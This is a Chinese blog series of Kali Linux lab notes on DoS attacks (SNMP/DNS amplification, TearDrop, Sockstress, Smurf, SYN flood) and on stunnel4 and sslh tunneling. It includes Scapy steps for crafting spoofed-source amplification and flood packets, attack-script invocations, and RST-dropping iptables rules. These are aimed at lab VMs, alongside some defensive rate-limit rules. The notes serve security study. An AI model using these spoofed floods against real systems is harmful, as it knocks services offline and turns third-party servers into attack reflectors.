Kali Linux笔记(八十四)：DoS--SNMP放大

发表于 2020-02-10 | 分类于 Kali
字数统计: 660 字 | 阅读时长 ≈ 3 分钟

1. SNMP放大攻击

  • 简单网络管理协议（▲ 实际中主要运用为网络设备的监视）
    • Simple Network Management Protocol
    • 服务端口UDP 161/162
    • ▲ 主动监控 → 被管理设备161端口，被动监控 → 管理设备162端口
    • 管理站（manager/客户端）、被管理设备（agent/服务端）
    • 管理信息数据库（MIB）是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类，包含分属不同组的多个数据对象
    • 每一个节点都有一个对象标识符（OID）来唯一的标识
    • IETF定义标准的MIB库/厂家自定义MIB库
  • 攻击原理
    • 请求流量小，查询结果返回流量大
    • 结合伪造源地址实现攻击

2. Scapy构造攻击数据包

  • Window Server 2003
    • 安装SNMP服务器（Win+R → appwiz.cpl → 更改或添加程序 → 管理和监控工具 → 简单网络管理协议SNMP，可能需要光盘）
      • Win+R → services.msc → SNMP Service → 代理 → 服务全选
      • Win+R → services.msc → SNMP Service → 安全 → 团体（Community）
      • 添加 → 团队权限（只读）、团队名称（asd）
      • 接受来自任何主机的SNMP数据包
    • 🔺命令：ifconfig查看IP地址，网卡模式为Bridge方式
  • Kali
    • IP头构造
      • i=IP()
      • i.dst=”Window Server 2003的IP地址”
      • i.display()
    • UDP头构造
      • u=udp()
      • u.dport=161
      • u.sport=161
      • u.display()
    • SNMP头构造
      • s=SNMP()
      • s.community=”asd”
      • s.display()
    • SNMP内容构造
      • b=SNMPbulk()
      • b.display()
      • b.max_repetitions=100（修改此数可增大回包数据大小）
      • b.varbindlist=[SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.1’)),SNMPvarbind(oid=ASN1_OID(‘1.3.6.1.2.1.19.1.3’))]
    • 拼接数据
      • s.PDU=b
      • s.display()
    • 发送数据包
      • r= (i/u/s)
      • r.display()
      • Sr1(r)
    • ▲ Kali开启Wireshark抓包，监听Kali的IP地址，查看返回的数据包的大小（出现分段数据包）

Kali Linux笔记(八十三)：DoS--DNS放大

发表于 2020-02-09 | 分类于 Kali
字数统计: 488 字 | 阅读时长 ≈ 2 分钟

1. DNS放大攻击

  • 产生大流量的攻击方法
    • 单机的带宽优势
    • 巨大单机数量形成的流量汇聚
    • 利用协议特性实现放大效果的流量
  • DNS协议放大效果
    • 查询请求流量小，但响应流量可能非常巨大
    • 🔺命令：dig hp.com @202.96.134.133（流量放大约8倍）
  • 攻击原理
    • 伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询
    • DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS

2. Scapy构造攻击数据包

  • Kali开启Wireshark抓包，监听Kali的IP地址
  • IP/UDP/DNS/DNS查询内容
  • IP头构造
    • i=IP()
    • i.dst=”202.96.134.133”
    • i.src=”被攻击者的IP”
    • i.display()
  • UDP头构造
    • u=udp()
    • u.display()
  • DNS头构造
    • d=DNS()
    • d.rd=1（递归查询）
    • d.qdount=1
    • d.display()
  • DNS内容构造
    • q=DNSQR()
    • q.qname=”hp.com”
    • q.qtype=255（A为默认记录，255即查所有记录）
    • q.display()
  • 拼接数据
    • d.qd=q
    • d.display()
  • 发送数据包
    • r=(i/u/d)
    • r.display()
    • sr1(r)
    • ▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）
  • ▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标
  • 🔺命令：./dns_flood.py 被攻击者的IP hp.com 20

1. TearDrop

  • 主要针对早期微软操作系统（95、98、3.X、nt）
    • 近些年有人发现对2.x版本的android系统、6.0 IOS系统攻击有效
  • 原理很有趣
    • 使用IP分段偏移值实现分段覆盖，接收端处理分段覆盖时可被拒绝服务
  • 攻击效果
    • 被攻击者蓝屏、重启、卡死
  • IP分段偏移值的数据包，以Window10下的 🔺命令：ping -l 4000 192.168.0.1

  • Ping大包，比较正常分段与teardrop攻击流量的区别
  • 针对早期windows系统SMB协议的攻击
    • 🔺命令：./teardrop_smb.py
    • 针对Android、IOS系统的攻击
    • 🔺命令：./teardrop_android_ios.py
    • 攻击向量并不确定，要是具体协议分析

Kali Linux笔记(八十一)：Sockstress

发表于 2020-02-09 | 分类于 Kali
字数统计: 857 字 | 阅读时长 ≈ 3 分钟

1. Sockstress

  • 2008年由Jack C.Louis发现
  • 针对TCP服务的拒绝服务攻击
    • 消耗被攻击目标系统资源，不消耗网络带宽自宽
    • 与攻击目标建立socket连接
    • ▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）
    • 攻击者资源消耗小（CPU、内存、带宽）
    • 异步攻击，单机可拒绝服务高配资源服务器
    • Window窗口实现TCP流控

2. 实验准备

  • Kali（攻击者）
    • 网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络
  • Metasploit（被攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

3. 实验–Python脚本

  • Metasploit（被攻击者）
    • 🔺命令：ifconfig查看IP地址
  • Kali（攻击者）
    • python脚本：🔺命令：./sockstress.py Metasploit的IP 21 200
    • ▲ 2020.2.9此脚本攻击效果甚微弱
  • Metasploit（被攻击者）
    • 🔺命令：top查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变
    • 🔺命令：netstat -pantu | grep ESTAB | wc -l（查看已经建立的连接数）
    • 🔺命令：Free -m（查看系统所用资源）

4. 实验–C脚本

  • Metasploit（被攻击者）
    • 🔺命令：ifconfig查看IP地址
  • Kali（攻击者）
    • 防火墙规则：🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP
    • 下载地址：https://github.com/defuse/sockstress
    • 🔺命令：gcc -Wall -c sockstress.c
    • 🔺命令：gcc -pthread -o sockstress sockstress.o
    • 🔺命令：./sockstress Metasploit的IP:80 eth0
    • 🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10
  • Metasploit（被攻击者）
    • 🔺命令：top查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变
    • 🔺命令：netstat -pantu | grep ESTAB | wc -l（查看已经建立的连接数）
    • 🔺命令：free -m（查看系统所用资源）

5. 防御措施

  • 直到今天sockstress攻击仍然是一种很有效的DoS攻击方式
  • 由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）
  • 根本的防御方法是采用白名单（不实际）
  • 折中对策：限制单位时间内每IP建的TCP连接数
    • 封杀每30秒与80端口建立连接10个的IP地址
    • 🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
    • 🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP
    • 以上规则对DDoS攻击无效
  • ▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试

1. Smurf

  • 世界上最古老的DDoS攻击
    • 向广播地址发送伪造源地址的ICMP echo Requset（ping）包
    • LAN所有计算机向伪造源地址返回响应包
    • 对现代操作系统几乎失效（不响应目标为广播的ping）

2. 实验准备

  • Kali（攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Metasploit（被攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

3. 实验

  • Metasploit（被攻击者）
    • ifconfig查看IP地址
  • Kali（攻击者）
    • Scapy
      • i=IP()
      • i.src=”Metasploit的IP地址”
      • i.dst=”网关的IP地址”
      • p=ICMP()
      • p.display()
      • send(i/p)
    • ▲ send(IP(dst=”网关IP地址”,src=”Metasploit的IP地址”)/ICMP(),count=100,verbose=1)
  • Metasploit（被攻击者）
    • 🔺命令：sudo tcpdump -i eth0（进行数据包抓取）
    • 查看局域网内是否有机器对伪造的源地址进行回应

Kali Linux笔记(七十九)：Syn-Flood

发表于 2020-02-09 | 分类于 Kali
字数统计: 727 字 | 阅读时长 ≈ 3 分钟

1. Syn-Flood

  • 常伴随IP欺骗
    • 真正的攻击目标
  • Scapy
    • i=IP()
    • i.dst=1.1.1.1
    • i.display()
    • t=TCP()
    • sr1(i/t,verbose=1,timeout=3)
    • sr1(IP(dst=1.1.1.1)/TCP())
  • ▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存

2. 实验–准备

  • Kali（攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Metasploit（Linux被攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Window XP SP3（Winodws被轰击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

3. 实验–Linux

  • Metasploit（Linux被攻击者）
    • 🔺命令：ifconfig查看IP地址
    • 查看开放的端口（TCP端口，🔺命令：netstat -pantu查看）
  • Kali（攻击者）
    • Scapy
      • i=IP()
      • i.dst=”Metasploit的IP”
      • i.display()
      • t=TCP()
      • t.dport=22
      • t.display()（查看发包是否flags=S）
      • sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）
    • ▲ sr1(IP(dst=”Metasploit的IP”)/TCP())
    • 开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包
    • 🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP
    • 🔺命令：iptables -L进行查看目标是否生效
    • 重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包
    • 先连接🔺命令：ssh msfadmin@Metasploit的IP，尝试连接速度是否延迟
    • 攻击脚本：🔺命令：./syn_flood.py Metasploit的IP 22 200
    • 在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆
  • Metasploit（Linux被攻击者）
    • 🔺命令：top查看系统性能，重点关注CPU和内存是否提高或者不变
    • 查看TCP连接：🔺命令：netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

4. 实验–Window

  • Window XP SP3（Winodws被攻击者）
    • 🔺命令：ifconfig查看IP地址
    • 关闭防火墙
    • 开启远程桌面，设置administrator密码（空密码不允许登陆）
  • Kali（攻击者）
    • 🔺命令：rdesktop尝试登陆，连接速度是否延迟
    • 🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP
    • 🔺命令：iptables -L进行查看目标是否生效
    • 攻击脚本：🔺命令：./syn_flood.py Window XP SP3的IP 3389 10
    • 在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆
  • ▲ Windows系统默认半开连接数10个

Kali Linux笔记(七十七)：DoS介绍及分类

发表于 2020-02-03 | 分类于 Kali
字数统计: 607 字 | 阅读时长 ≈ 2 分钟

1. 拒绝服务

  • DoS不是DOS
    • 利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务
  • DDoS分布式拒绝服务
    • 一对一的攻击完全拼各自的资源，效果差
    • 多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型
  • 历史
    • 以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）
    • 现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）
      • 电商网站被勒索，Bill gates僵尸程序
      • 贩卖和租用肉鸡已经称为黑产中重要的一部分
      • 最终的办法就是拼资源，投资抗D，或者乖乖交保护费
  • Anonymous匿名者
    • 世界最著名的黑客组织
    • 组织结构宽松，人员来自世界各地
    • 以DDoS攻击著称的无政府主义者
    • 亦正亦邪，攻击恐怖组织也攻击政府宗教机构
    • 近些年来涉足政治斗争
    • 成员露面时均带有Guy Fawkes面具
    • 最早的核心成员来自4chan图片社区
    • 惯常雇佣外围黑客成员发动DDoS
    • 口号：
      • We are Anonymous,We are a Legion,We do not forgive,We do not forget,
        Expect us.

2. DoS分类

  • D网络
    • 基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）
    • ICMP Flood、UDP Flood
  • D协议
    • 攻击协议漏洞发起的拒绝服务攻击
    • 如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL
    • ▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）
    • ▲ ARP（基于传闻的协议，发送即被接受）
  • D应用
    • 针对应用软件和操作系统漏洞发起的拒绝服务攻击
    • 大量频繁访问消耗系统资源严重的应用（CC）
    • 通常表现为操作系统运行正常，网络流量不大，但服务停止响应
    • 可以是一击毙命的，也可以是耗尽目标资源的

3. 为何被DoS

  • 从攻击者到被害者
    • 网络（网络设备等）→ FireWall → 服务器OS → 服务应用
  • 资源耗尽
    • 网络：带宽
    • Firewall：吞吐量、并发连接
    • 服务器：CPU、内存、I/O
    • 应用：处理请求能力、对OS资源的使用权
  • 程序漏洞攻击
    • 缓冲区溢出
    • 协议、程序逻辑漏洞
  • 链路上任何一点都可成为目标

Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4

发表于 2020-02-03 | 分类于 Kali
字数统计: 569 字 | 阅读时长 ≈ 2 分钟

1. stunnel4

  • 无需修改原代码的情况下将TCP流量封装于SSL通道内
  • 适用于本身不支持加密传输的应用
  • 支持openssl安全特性
  • 跨平台
  • 性能优

2. 实验

  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • bodhi（stunnel4 Server）
    • 网卡方式为NAT方式，检查网络
  • metasploit（内网的应用服务器，mysql）
    • 网卡方式为Host-only方式，检查网络
  • bodhi（stunnel4 Server）
    • 🔺命令：apt-get install stunnel4
    • 网卡方式修改为Host-only方式，检查网络
    • 浏览器访问mono防火墙
    • 编辑上一个小节的NAT规则
      • Protocol → TCP
      • External port range → from:3306
      • NAT IP → Metasploit的IP地址
      • Local port → 3306
      • 保存更改的应用
    • 编辑上一小节的Rules规则（WAN口）
      • Destination port range → from:other 3306/to:3306
      • 保存更改的应用
  • Kali（stunnel4 Client）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
    • 开启Wireshark抓包（ip.address=mono的WAN的IP）
    • 🔺命令：mysql -u root -h mono的WAN的IP
    • 🔺命令：show databases;
    • ▲ Wireshark的TCP Stream可以查看到为明文信息
  • bodhi（stunnel4 Server）
    • 生成证书：🔺命令：openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/ stunnel.pem -keyout /etc/stunnel/stunnel.pem
    • 创建配置文件：/etc/stunnel/stunnel.conf
      • cert = /etc/stunnel/stunnel.pem
      • setuid = stunnel4
      • setgid = stunnel4
      • pid = /var/run/stunnel4/stunnel4.pid
      • [mysqls]
      • accept = 0.0.0.0:443
      • connect = Metasploit的IP:3306
    • stunnel4自动启动
      • /etc/default/stunnel4 → ENABLED=1

Kali Linux笔记(七十五)：一端口多服务隧道--sslh

发表于 2020-02-03 | 分类于 Kali
字数统计: 906 字 | 阅读时长 ≈ 3 分钟

1. sslh（ssl+ssh）

  • 端口分配器
    • 根据客户端第一个包检测协议类型
    • 根据协议检测结果将流量转发给不同目标
    • 支持HTTP、HTTPS、SSH、OpenVPN、tinc、XMAPP和可基于正则表达式判断的人和协议类型
    • 适用于防火墙允许443端口入站访问流量的环境

2. 实验

  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • Kali（SSLH）
    • 网卡方式为Host-only方式，检查网络
  • Window Server 2003（内网的CA服务器）
    • 网卡方式为Host-only方式，检查网络
    • 安装web server
      • Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS → 万维网服务/Active Server Pages，可能需要光盘）
    • 安装CA服务器
      • Win+R → appwiz.cpl → 更改或添加程序 → 证书服务
      • 独立根CA类型、证书名称：LAB CA、有效期限
    • 开始 → Internet信息服务（IIS）管理器
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 服务器证书 → 名称：www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市 → 修改申请文件放置位置
      • 浏览器范围访问http://127.0.0.1/certsrv/ → 申请证书 → 高级证书 → BASE64编码 → 粘贴证书服务器代码 → 提交
    • 开始 → 证书服务器管理
      • LAB CA → 挂起的申请 → 选中申请的证书右键 → 所有任务 → 颁发
      • 证书可以在颁发的证书中查看详细信息
    • 浏览器范围访问http://127.0.0.1/certsrv/ → 查看挂起的证书申请状态 → 下载证书 → 保存在桌面
    • 开始 → Internet信息服务（IIS）管理器
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 服务器证书 → 处理挂起的请求并安装证书
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 查看证书
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 编辑 → 要求安全通道（SSL）
      • 停止网站 → 重新启动
  • Kali（SSLH）
    • 浏览器访问https://Window Server 2003的IP，看是否能通过SSL通道进行通信
    • 配置文件：🔺命令：vi /etc/default/sslh
      • RUN=yes
      • DAEMON=/usr/sbin/sslh
      • DAEMON_OPTS=”–user sslh –listen 本机的IP:443 –ssh 127.0.0.1:22 –http 127.0.0.1:80 –ssl Window Server 2003的IP:443 –pidfile /var/run/sslh/sslh.pid”
    • 启动apache服务，修改侦听端口🔺命令：vi /etc/apache2/ports.conf → 127.0.0.1:80，重启apache服务，🔺命令：netstat -pantu查看是否更改
    • 开启SSH服务（修改SSH配置文件）
  • Mono防火墙
    • 浏览器访问mono防火墙
    • 新建NAT规则
      • Interface → WAN
      • External address → Interface address（若为网段其他的IP映射，需设置为WAN address → Server NAT → 加入整个网段）
      • Protocol → TCP
      • External port range → HTTPS/HTTPS
      • NAT IP → KALI的IP
      • Auto-add a firewall rule to permit traffic through this NAT rule
    • 保存应用，Rules的WAN口多出一条rule
  • Kali（SSLH）
    • 🔺命令：service sslh start（netstat -pantu进行查看）
    • 浏览器验证本机http是否正常进行
  • 物理机
    • 浏览器访问http://防火墙WAN的IP:443 → Kali的Web资源
    • 浏览器访问https://防火墙WAN的IP → Window Server 2003的Web资源
    • ssh尝试登陆防火墙WAN的IP:443进行登陆
  • 🔺命令：namp -p443 -sV -A 防火墙WAN的IP
    • 基本可以扫描出所有的服务
